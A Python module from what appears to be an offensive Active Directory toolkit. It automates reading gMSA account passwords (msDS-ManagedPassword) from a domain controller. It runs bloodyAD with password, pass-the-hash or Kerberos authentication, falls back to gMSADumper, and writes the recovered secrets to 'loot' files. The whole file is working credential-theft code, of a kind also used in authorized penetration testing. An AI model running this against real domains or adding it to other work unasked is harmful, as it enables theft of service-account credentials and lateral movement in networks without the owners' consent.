# modules/readgmsa.py

import os
import shutil
from core.colors import red, green, yellow, blue
from core.helpers import run_command, select_from_list, save_loot

def attack_readgmsa(session, *parts):
    print(blue("[*] Attempting to read gMSA password via BloodyAD..."))

    # === Use argument from CLI if provided ===
    gmsa_account = parts[0] if parts and parts[0] else None

    # === Fallback to interactive selection
    if not gmsa_account:
        gmsa_account = _select_gmsa_account()

    if not gmsa_account.endswith("$"):
        gmsa_account += "$"

    # === Build BloodyAD command
    if session.hash:
        auth = f"-u {session.username} -p :{session.hash}"
        bloody_cmd = (
            f"bloodyAD --host {session.target_ip} -d {session.domain} "
            f"{auth} get object \"{gmsa_account}\" --attr msDS-ManagedPassword"
        )
    elif session.password:
        auth = f"-u {session.username} -p \"{session.password}\""
        bloody_cmd = (
            f"bloodyAD --host {session.target_ip} -d {session.domain} "
            f"{auth} get object \"{gmsa_account}\" --attr msDS-ManagedPassword"
        )
    else:
        if not session.dc_hostname:
            print(red("[-] Kerberos mode requires session.dc_hostname."))
            return
        bloody_cmd = (
            f"bloodyAD --kerberos --host {session.dc_hostname} --dc-ip {session.dc_ip} "
            f"-d {session.domain} get object \"{gmsa_account}\" --attr msDS-ManagedPassword"
        )

    out, err = run_command(bloody_cmd)
    combined = out + "\n" + err

    # === Success Case
    if "msDS-ManagedPassword" in combined or "NTLM" in combined:
        print(green(f"[+] gMSA password found:\n{out.strip()}"))
        save_loot("gmsa_secrets.txt", combined)
        return

    # === Object exists, but attribute not readable
    if "distinguishedName" in combined and "msDS-ManagedPassword" not in combined:
        print(yellow("[!] Object exists but attribute msDS-ManagedPassword is not readable."))
        save_loot("gmsa_partial.txt", combined)
        return

    print(red(f"[!] BloodyAD failed: {err if err else out}"))

    if "access denied" in combined.lower():
        print(yellow("[!] Access denied. Trying fallback..."))
    elif "not found" in combined.lower():
        print(red(f"[-] gMSA object not found: {gmsa_account}"))
        return
    else:
        print(blue("[*] Trying fallback with gMSADumper..."))

    # === Fallback with gMSADumper
    if not shutil.which("gMSADumper.py"):
        print(red("[-] gMSADumper.py not found in PATH."))
        return

    if session.hash:
        fallback_cmd = (
            f"python3 gMSADumper.py {session.domain}/{session.username} "
            f"-hashes :{session.hash} -dc-ip {session.target_ip}"
        )
    elif session.password:
        fallback_cmd = (
            f"python3 gMSADumper.py {session.domain}/{session.username}:{session.password} "
            f"@{session.target_ip}"
        )
    else:
        print(yellow("[!] Kerberos-only auth detected. gMSADumper fallback not supported."))
        return

    out, err = run_command(fallback_cmd)
    combined = out + "\n" + err

    if gmsa_account.lower() in combined.lower() and "ManagedPassword" in combined:
        print(green(f"[+] gMSADumper succeeded:\n{out.strip()}"))
        save_loot("gmsa_secrets.txt", combined)
    else:
        print(red(f"[-] gMSADumper failed or no secrets found."))
        if err:
            print(yellow(f"[!] Error: {err.strip()}"))

def _select_gmsa_account():
    loot_file = "loot/gmsa_accounts.txt"

    if os.path.exists(loot_file):
        with open(loot_file, "r") as f:
            gmsas = [line.strip() for line in f if line.strip()]
        if gmsas:
            return select_from_list(gmsas, "Select gMSA account to extract")
        else:
            print(yellow("[*] gmsa_accounts.txt is empty."))

    print(yellow("[*] No gMSA accounts in loot/."))
    return input("[?] Enter gMSA name (e.g., web01$): ").strip()
